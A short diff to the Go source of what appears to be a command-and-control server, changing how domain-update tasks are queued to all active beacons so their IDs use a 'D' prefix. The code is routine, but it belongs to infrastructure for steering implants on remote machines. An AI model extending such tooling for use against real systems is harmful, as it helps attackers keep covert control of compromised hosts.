@@ -774,13 +774,15 @@ func main() {
 		}
 
 		// Queue update_domains task for ALL active beacons
+		// CRITICAL: Domain updates are DNS-server-initiated, not Master tasks
+		// Use AddDomainUpdateTask to avoid conflicts with Master task IDs
 		beacons := c2Manager.GetBeacons()
 		taskCommand := fmt.Sprintf("update_domains:%s", string(domainsJSON))
 
 		activeCount := 0
 		for _, beacon := range beacons {
-			// AddTask returns the taskID, we don't need to generate it
-			taskID := c2Manager.AddTask(beacon.ID, taskCommand)
+			// AddDomainUpdateTask uses "D" prefix (D0001, D0002) instead of "T" to avoid conflicts
+			taskID := c2Manager.AddDomainUpdateTask(beacon.ID, taskCommand)
 			if taskID != "" {
 				logf("[C2] 📤 Queued domain update task %s for beacon %s", taskID, beacon.ID)
 				activeCount++
